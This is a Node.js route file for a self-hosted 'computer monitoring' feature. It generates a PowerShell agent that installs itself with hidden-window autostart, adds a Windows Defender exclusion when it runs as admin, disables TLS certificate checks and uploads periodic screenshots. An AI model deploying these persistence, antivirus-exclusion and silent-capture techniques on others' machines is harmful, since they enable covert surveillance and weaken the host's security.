// 电脑监控路由（v1.3.5）：
// - /monitor/agent/*  代理端点（EXEMPT 免登录，凭接入密钥 access_key 鉴权）
// - /monitor/*        工作台端点（登录 + tools/monitor tab 权限；设置/设备管理仅 admin）
const express = require('express');
const multer = require('multer');
const { db, getSetting } = require('../db');
const monitor = require('../services/monitorService');

const router = express.Router();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });

const DEVICE_ID_RE = /^[A-Za-z0-9_-]{6,32}$/;
const WIDTHS = [320, 480, 720, 1080];

// ---------- 代理端点（免登录，密钥鉴权） ----------
function keyOk(req, key) {
  const cfg = monitor.getConfig();
  return String(key || '') === cfg.access_key && !!cfg.access_key;
}

// 代理每周期先取配置（间隔/启停随工作台设置即时生效；v1.4.7 起设备级覆盖优先，未设置回落全局默认）
router.get('/monitor/agent/config', (req, res) => {
  const { id, key } = req.query;
  if (!keyOk(req, key)) return res.status(403).json({ error: '接入密钥不正确' });
  if (!DEVICE_ID_RE.test(String(id || ''))) return res.status(400).json({ error: '设备 ID 不合法' });
  const dev = monitor.ensureDevice(String(id), String(req.query.computer || '').slice(0, 60));
  const eff = monitor.effCfg(dev, monitor.getConfig());
  // v1.4.9：分辨率数值语义=图片高度（720≈720p、1080≈1080p）。height 给新版代理（按高度缩放）；
  // width 同值保留给旧版代理（旧脚本按宽度用，宽屏/多屏下图片偏小，重装新代理后自动切到按高度）
  res.json({ ok: true, enabled: !!(dev.enabled && eff.interval >= 1), interval: eff.interval, width: eff.width, height: eff.width });
});

// 截图上报（multipart：id、key 字段 + shot 文件，480px JPEG）
router.post('/monitor/agent/shot', upload.single('shot'), (req, res) => {
  const { id, key } = req.body || {};
  if (!keyOk(req, key)) return res.status(403).json({ error: '接入密钥不正确' });
  if (!DEVICE_ID_RE.test(String(id || ''))) return res.status(400).json({ error: '设备 ID 不合法' });
  const dev = monitor.ensureDevice(String(id), String(req.body.computer || '').slice(0, 60));
  if (!dev.enabled) return res.json({ ok: true, skipped: 'disabled' });
  const buf = req.file && req.file.buffer;
  if (!buf || !buf.length) return res.status(400).json({ error: '缺少截图文件' });
  const head = buf.subarray(0, 3).toString('hex');
  const isJpg = head === 'ffd8ff';
  const isPng = buf.subarray(0, 4).toString('hex') === '89504e47';
  if (!isJpg && !isPng) return res.status(400).json({ error: '仅支持 JPEG/PNG 截图' });
  const eff = monitor.effCfg(dev, monitor.getConfig());
  const sid = monitor.addShot(String(id), buf, eff.interval); // 带上当时间隔，开关机会话推导依据
  monitor.maybeAnalyze(String(id)).catch(() => { /* 异步分析自兜底 */ });
  res.json({ ok: true, id: sid });
});

// ---------- 工作台端点 ----------
router.get('/monitor/devices', (req, res) => {
  res.json({ devices: monitor.listDevices() });
});

router.put('/monitor/devices/:id', (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: '仅管理员' });
  const dev = db.prepare('SELECT * FROM monitor_devices WHERE id=?').get(req.params.id);
  if (!dev) return res.status(404).json({ error: '设备不存在' });
  const b = req.body || {};
  if ('name' in b) {
    const name = String(b.name || '').trim().slice(0, 60);
    db.prepare('UPDATE monitor_devices SET name=? WHERE id=?').run(name || dev.name, dev.id);
  }
  if ('enabled' in b) db.prepare('UPDATE monitor_devices SET enabled=? WHERE id=?').run(b.enabled ? 1 : 0, dev.id);
  // 设备级间隔/分辨率覆盖（v1.4.7）：传数字且合法则存；空/0/非法值 = 清除覆盖（回落全局默认）
  if ('interval' in b) {
    const n = Number(b.interval);
    db.prepare('UPDATE monitor_devices SET interval=? WHERE id=?').run(Number.isFinite(n) && n >= 1 && n <= 120 ? Math.round(n) : null, dev.id);
  }
  if ('width' in b) {
    const w = Number(b.width);
    db.prepare('UPDATE monitor_devices SET width=? WHERE id=?').run([320, 480, 720, 1080].includes(w) ? w : null, dev.id);
  }
  // 显示排序（v1.4.8）：1~99 数字小的排前面；0/非法值 = 默认（按接入先后）
  if ('sort_order' in b) {
    const so = Number(b.sort_order);
    db.prepare('UPDATE monitor_devices SET sort_order=? WHERE id=?').run(Number.isFinite(so) && so >= 1 && so <= 99 ? Math.round(so) : 0, dev.id);
  }
  // 设备级 AI 分析开关（v1.4.8）：1=开 0=关；null/其他 = 清除覆盖（跟随全局）
  if ('ai_enabled' in b) {
    const v = b.ai_enabled === 1 || b.ai_enabled === true ? 1 : b.ai_enabled === 0 || b.ai_enabled === false ? 0 : null;
    db.prepare('UPDATE monitor_devices SET ai_enabled=? WHERE id=?').run(v, dev.id);
  }
  // 单独配置全量保存（v1.4.8）：solo=1 落全量设备级配置（interval/width/ai_enabled 列 + 其余键进 cfg_json，
  // 未传/非法的键回落全局默认值）；solo=0 清空全部覆盖（跟随全局）
  if ('solo' in b) {
    const cfg = monitor.getConfig();
    if (b.solo) {
      const num = (v, min, max, dflt) => {
        const n = Number(v);
        return Number.isFinite(n) && n >= min && n <= max ? Math.round(n) : dflt;
      };
      const kws = (Array.isArray(b.keywords) ? b.keywords : String(b.keywords || '').split(/[,，\s]+/))
        .map((s) => String(s).trim()).filter(Boolean);
      const valid = new Set(db.prepare('SELECT id FROM users WHERE is_bot=0').all().map((r) => r.id));
      const users = (Array.isArray(b.alert_users) ? b.alert_users : []).map(Number).filter(Boolean)
        .filter((i) => valid.has(i));
      db.prepare('UPDATE monitor_devices SET interval=?, width=?, ai_enabled=?, cfg_json=? WHERE id=?').run(
        num(b.interval, 1, 120, cfg.interval),
        WIDTHS.includes(Number(b.width)) ? Number(b.width) : (cfg.width || 480),
        b.ai_enabled ? 1 : 0,
        JSON.stringify({
          ai_every: num(b.ai_every, 1, 50, cfg.ai_every),
          retention_days: num(b.retention_days, 1, 180, cfg.retention_days),
          keywords: [...new Set(kws)].slice(0, 30),
          alert_users: [...new Set(users)].slice(0, 20),
          alert_cooldown: num(b.alert_cooldown, 0, 1440, cfg.alert_cooldown),
        }),
        dev.id
      );
    } else {
      db.prepare('UPDATE monitor_devices SET interval=NULL, width=NULL, ai_enabled=NULL, cfg_json=NULL WHERE id=?').run(dev.id);
    }
  }
  res.json({ ok: true, device: db.prepare('SELECT * FROM monitor_devices WHERE id=?').get(dev.id) });
});

router.delete('/monitor/devices/:id', (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: '仅管理员' });
  const dev = db.prepare('SELECT * FROM monitor_devices WHERE id=?').get(req.params.id);
  if (!dev) return res.status(404).json({ error: '设备不存在' });
  const rows = db.prepare('SELECT id, storage_path FROM monitor_shots WHERE device_id=?').all(dev.id);
  const fs = require('node:fs');
  for (const r of rows) { if (r.storage_path) { try { fs.unlinkSync(r.storage_path); } catch { /* 已不在 */ } } }
  db.prepare('DELETE FROM monitor_shots WHERE device_id=?').run(dev.id);
  db.prepare('DELETE FROM monitor_devices WHERE id=?').run(dev.id);
  res.json({ ok: true });
});

router.get('/monitor/shots', (req, res) => {
  const deviceId = String(req.query.device_id || '');
  if (!DEVICE_ID_RE.test(deviceId)) return res.status(400).json({ error: '设备 ID 不合法' });
  const page = Math.max(1, Number(req.query.page) || 1);
  const pageSize = Math.min(50, Math.max(5, Number(req.query.page_size) || 15));
  res.json(monitor.listShots(deviceId, page, pageSize));
});

// 截图图片本体（<img> 经 ?token= 鉴权，同家庭图床模式）
router.get('/monitor/shot/:id', (req, res) => {
  const row = db.prepare('SELECT * FROM monitor_shots WHERE id=?').get(Number(req.params.id) || 0);
  if (!row) return res.status(404).json({ error: '截图不存在' });
  const buf = monitor.shotBuf(row);
  if (!buf) return res.status(404).json({ error: '截图数据缺失' });
  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Cache-Control', 'private, max-age=86400');
  res.end(buf);
});

// 删除截图（单张/批量，仅 admin）：body { ids:[1,2,...] }。命中预警（永久保留）的也仅经此手动删除
router.post('/monitor/shots/delete', (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: '仅管理员' });
  const ids = Array.isArray(req.body && req.body.ids) ? req.body.ids : [];
  const deleted = monitor.deleteShots(ids);
  if (!deleted) return res.status(404).json({ error: '未找到可删除的截图' });
  res.json({ ok: true, deleted });
});

// 开关机时段（服务端推导后分页；默认每页 5 行，与前端一致）
router.get('/monitor/sessions', (req, res) => {
  const deviceId = String(req.query.device_id || '');
  if (!DEVICE_ID_RE.test(deviceId)) return res.status(400).json({ error: '设备 ID 不合法' });
  const page = Math.max(1, Number(req.query.page) || 1);
  const pageSize = Math.min(50, Math.max(5, Number(req.query.page_size) || 5));
  const all = monitor.listSessions(deviceId);
  res.json({ total: all.length, items: all.slice((page - 1) * pageSize, page * pageSize) });
});

// ---------- 设置（仅 admin） ----------
router.get('/monitor/settings', (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: '仅管理员' });
  res.json(monitor.getConfig());
});

router.put('/monitor/settings', (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: '仅管理员' });
  res.json(monitor.saveConfig(req.body || {}));
});

// ---------- 代理安装包（仅 admin：内嵌接入密钥） ----------
// 推断要内嵌进代理脚本的基础地址：**下载来源优先**——管理员从哪个地址登录工作台，
// 代理就内嵌哪个地址。局域网地址（如 http://192.168.x.x:3000）登录下载 → 代理走内网直连，
// 不绕公网隧道、换域名也不影响已装代理；域名登录下载 → 内嵌域名。
// 无来源头的下载（地址栏直开等）才回落已配置的外网地址（设置→多平台→地址配置），
// 最后 X-Forwarded-Proto（隧道/反代终止 TLS 时 protocol 不可信）→ req.protocol。
function baseUrl(req) {
  const clean = (u) => String(u || '').replace(/\/+$/, '');
  const org = clean(req.get('origin'));
  if (/^https?:\/\//i.test(org)) return org;
  const ref = clean(String(req.get('referer') || '').replace(/^(https?:\/\/[^/?#]+).*$/i, '$1'));
  if (/^https?:\/\//i.test(ref)) return ref;
  const ext = clean(getSetting(db, 'external_base_url', ''));
  if (/^https?:\/\//i.test(ext)) return ext;
  const xfp = String(req.get('x-forwarded-proto') || '').split(',')[0].trim();
  return `${xfp || req.protocol}://${req.get('host')}`;
}

const PS_TEMPLATE = [
  '# 个人工作台·电脑监控 代理脚本（由「效率工具→电脑监控」页生成）',
  '# 首次在本机运行 = 安装（复制自身到 %LOCALAPPDATA%\\WorkbenchMonitor 并注册开机自启）；',
  '# 从安装目录运行 = 常驻截图上报。卸载：powershell -File 本文件 -Remove',
  'param([switch]$Remove)',
  "$Server = '__SERVER__'",
  "$Key    = '__KEY__'",
  "$Dir = Join-Path $env:LOCALAPPDATA 'WorkbenchMonitor'",
  "$RunName = 'WorkbenchMonitor'",
  '# 运行日志：安装目录 agent.log（排障用；>256KB 自动清零重写）',
  "$LogFile = Join-Path $Dir 'agent.log'",
  "function Log([string]$m) { try { Add-Content -Path $LogFile -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' ' + $m) -ErrorAction SilentlyContinue } catch {} }",
  '',
  'if ($Remove) {',
  "  Log 'uninstall: removing autostart / processes / directory'",
  "  Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $RunName -ErrorAction SilentlyContinue",
  "  Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like ('*' + $Dir + '*') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }",
  '  $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)',
  '  if ($isAdmin) { Remove-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue }',
  '  Remove-Item $Dir -Recurse -Force -ErrorAction SilentlyContinue',
  '  Write-Host \'已卸载电脑监控（开机自启已移除；如目录被占用，重启后可手动删除）\'',
  '  exit',
  '}',
  '',
  '# --- 安装分支：不在安装目录时执行安装后退出 ---',
  'if ($PSCommandPath -and (-not $PSCommandPath.StartsWith($Dir))) {',
  '  New-Item -ItemType Directory -Force -Path $Dir | Out-Null',
  "  Log ('installing, source=' + $PSCommandPath)",
  '  Copy-Item $PSCommandPath (Join-Path $Dir \'monitor.ps1\') -Force',
  '  $agentCmd = \'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "\' + $Dir + \'\\monitor.ps1"\'',
  "  New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $RunName -Value $agentCmd -PropertyType String -Force | Out-Null",
  '  $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)',
  '  if ($isAdmin) {',
  '    # 家用电脑自管理：把安装目录加入 Defender 排除，避免截图脚本被启发式误报拦截（任务管理器可随时看到本进程）',
  '    Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue',
  '  } else {',
  '    Write-Host \'提示：当前非管理员，未自动添加杀软白名单；如被拦截，请手动把下面目录加入杀软信任区\'',
  '  }',
  '  Start-Process -FilePath \'powershell.exe\' -ArgumentList (\'-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "\' + $Dir + \'\\monitor.ps1"\')',
  '  Write-Host (\'安装完成，已开始截图上报并注册开机自启。安装目录：\' + $Dir)',
  '  Write-Host \'卸载方法：powershell -ExecutionPolicy Bypass -File 本文件 -Remove\'',
  '  exit',
  '}',
  '',
  '# --- 常驻分支：截图上报循环 ---',
  '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12',
  '# 内嵌地址可能是内网自签名 HTTPS（按下载来源内嵌），必须放行证书校验。',
  '# 只能用编译型 C# 回调：脚本块 { $true } 形式的 ServerCertificateValidationCallback 会在 TLS 握手线程上',
  '# 因无 PowerShell 运行空间而炸（"此线程中没有可用于运行脚本的运行空间…脚本块为: $true"→"基础连接已经关闭: 发送时发生错误"）',
  "if (-not ('MonitorTlsTrust' -as [type])) {",
  "  Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class MonitorTlsTrust : ICertificatePolicy { public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; } }'",
  '}',
  '[System.Net.ServicePointManager]::CertificatePolicy = New-Object MonitorTlsTrust',
  '# 禁用系统代理强制直连：本机的代理/加速器会掐断内网请求（"基础连接已经关闭: 发送时发生错误"的头号元凶；浏览器对本地地址绕代理所以网页能开、PS 不绕所以挂）',
  '[System.Net.WebRequest]::DefaultWebProxy = $null',
  '# 单实例互斥（v1.4.4 锁名 _v2 起步）：旧名 Global\WorkbenchMonitor 可能被残留的僵尸旧版代理占死',
  '# （进程列表找不到/杀不掉，只有重启能清）——改名绕开；仍防同机双开，语义不变',
  "$mtx = New-Object System.Threading.Mutex($false, 'Global\\WorkbenchMonitor_v2')",
  '$mtxHeld = $false',
  'try { $mtxHeld = $mtx.WaitOne(0) } catch { $mtxHeld = $true }',
  'if (-not $mtxHeld) {',
  "  Log 'mutex busy - another instance running, exit'",
  "  Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -ne $PID -and $_.CommandLine -like '*WorkbenchMonitor*' } | ForEach-Object { Log ('holder pid=' + $_.ProcessId + ' cmd=' + $_.CommandLine) }",
  '  exit',
  '}',
  'Add-Type -AssemblyName System.Windows.Forms',
  'Add-Type -AssemblyName System.Drawing',
  'Add-Type -AssemblyName System.Net.Http',
  '',
  '# 设备特征码：MachineGuid + 计算机名 的 SHA256 前 12 位（重装系统才会变化）',
  '$guid = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -Name MachineGuid).MachineGuid',
  '$sha = [Security.Cryptography.SHA256]::Create()',
  '$hash = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes("$guid|$env:COMPUTERNAME")) | ForEach-Object { $_.ToString(\'x2\') }) -join \'\'',
  "$Id = 'PC' + $hash.Substring(0, 12)",
  'if ((Test-Path $LogFile) -and ((Get-Item $LogFile).Length -gt 262144)) { Remove-Item $LogFile -Force -ErrorAction SilentlyContinue }',
  "Log ('resident start id=' + $Id + ' server=' + $Server)",
  '',
  'function Get-AgentConfig {',
  '  try {',
  '    $u = "$Server/api/monitor/agent/config?id=$Id&key=$Key&computer=$env:COMPUTERNAME"',
  '    $r = Invoke-RestMethod -Uri $u -TimeoutSec 10',
  "    Log ('config ok interval=' + $r.interval + ' height=' + $r.height)",
  '    $ht = 0',
  '    if ($r.height -ge 320) { $ht = [int]$r.height } elseif ($r.width -ge 320) { $ht = [int]$r.width }',
  '    return @{ enabled = [bool]$r.enabled; interval = [int]$r.interval; height = $ht }',
  "  } catch { Log ('config FAIL: ' + $_.Exception.Message + $(if ($_.Exception.InnerException) { ' / inner: ' + $_.Exception.InnerException.Message } else { '' })); return $null }",
  '}',
  '',
  '# 目标值为图片高度（v1.4.9）：720≈720p、1080≈1080p，宽度按屏幕比例等比缩放；',
  '# 多显示器拼接时每屏保持该高度（旧版按宽度缩放，宽屏/多屏下图片偏小偏糊）',
  'function New-ShotBytes([int]$Height) {',
  '  $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen',
  '  $bmp = New-Object System.Drawing.Bitmap($vs.Width, $vs.Height)',
  '  $g = [System.Drawing.Graphics]::FromImage($bmp)',
  '  $g.CopyFromScreen($vs.X, $vs.Y, 0, 0, $bmp.Size)',
  '  $g.Dispose()',
  '  $h = $Height',
  '  if ($h -ne 320 -and $h -ne 480 -and $h -ne 720 -and $h -ne 1080) { $h = 480 }',
  '  $w = [int]([double]$vs.Width * $h / $vs.Height)',
  '  if ($w -lt 1) { $w = 1 }',
  '  $small = New-Object System.Drawing.Bitmap($w, $h)',
  '  $g2 = [System.Drawing.Graphics]::FromImage($small)',
  '  $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBilinear',
  '  $g2.DrawImage($bmp, 0, 0, $w, $h)',
  '  $g2.Dispose()',
  '  $bmp.Dispose()',
  '  $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq \'image/jpeg\' }',
  '  $ep = New-Object System.Drawing.Imaging.EncoderParameters(1)',
  '  $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]80)',
  '  $ms = New-Object System.IO.MemoryStream',
  '  $small.Save($ms, $codec, $ep)',
  '  $small.Dispose()',
  '  return $ms.ToArray()',
  '}',
  '',
  'function Send-Shot($bytes) {',
  '  $h = New-Object System.Net.Http.HttpClientHandler',
  '  $h.UseProxy = $false',
  '  $http = New-Object System.Net.Http.HttpClient($h)',
  '  $http.Timeout = [TimeSpan]::FromSeconds(60)',
  '  $form = New-Object System.Net.Http.MultipartFormDataContent',
  '  $form.Add([System.Net.Http.StringContent]::new($Id), \'id\')',
  '  $form.Add([System.Net.Http.StringContent]::new($Key), \'key\')',
  '  $bc = New-Object System.Net.Http.ByteArrayContent(, $bytes)',
  "  $bc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/jpeg')",
  '  $form.Add($bc, \'shot\', \'s.jpg\')',
  '  try {',
  '    $t = $http.PostAsync("$Server/api/monitor/agent/shot", $form)',
  '    $t.Wait()',
  '    $ok = $t.Result.IsSuccessStatusCode',
  "    Log ('shot ' + $(if ($ok) { 'posted' } else { 'FAIL http=' + [int]$t.Result.StatusCode }))",
  '    return $ok',
  "  } catch { Log ('shot FAIL: ' + $_.Exception.Message); return $false } finally { $http.Dispose() }",
  '}',
  '',
  '$interval = 3',
  '$shotH = 480',
  'while ($true) {',
  '  $cfg = Get-AgentConfig',
  '  if ($cfg) {',
  '    if ($cfg.interval -ge 1 -and $cfg.interval -le 120) { $interval = $cfg.interval }',
  '    if ($cfg.height -ge 320) { $shotH = $cfg.height }',
  '    if ($cfg.enabled) {',
  '      try {',
  '        $b = New-ShotBytes $shotH',
  '        if ($b -and $b.Length -gt 0) { Send-Shot $b | Out-Null }',
  "      } catch { Log ('capture FAIL: ' + $_.Exception.Message) }",
  '    }',
  '  }',
  '  if ($cfg) { Start-Sleep -Seconds ([Math]::Max(60, $interval * 60)) } else { Start-Sleep -Seconds 60 }',
  '}',
].join('\r\n');

const INSTALL_BAT = [
  '@echo off',
  'rem Workbench Monitor - install (put together with monitor-setup.ps1, then double-click)',
  'cd /d "%~dp0"',
  'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "monitor-setup.ps1"',
  'pause',
].join('\r\n');

const UNINSTALL_BAT = [
  '@echo off',
  'rem Workbench Monitor - uninstall',
  'cd /d "%~dp0"',
  'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "monitor-setup.ps1" -Remove',
  'pause',
].join('\r\n');

router.get('/monitor/agent-files', (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: '仅管理员' });
  const type = String(req.query.type || '');
  const cfg = monitor.getConfig();
  // 不设 Cache-Control：no-store 会让 Chrome/Edge <a download> 直点下载报「请检查互联网状况」
  // （复制链接新开窗口却能下）——宠物模块 agent-files 踩过同款坑（v1.3.8 批），监控这边同步修复。
  if (type === 'setup') {
    const ps = PS_TEMPLATE.replace(/__SERVER__/g, baseUrl(req)).replace(/__KEY__/g, cfg.access_key);
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="monitor-setup.ps1"');
    return res.end('\uFEFF' + ps); // UTF-8 BOM：PS 5.1 无 BOM 会按 ANSI 解析中文注释
  }
  if (type === 'install') {
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="install-monitor.bat"');
    return res.end(INSTALL_BAT);
  }
  if (type === 'uninstall') {
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="uninstall-monitor.bat"');
    return res.end(UNINSTALL_BAT);
  }
  res.status(400).json({ error: '未知文件类型' });
});

module.exports = router;
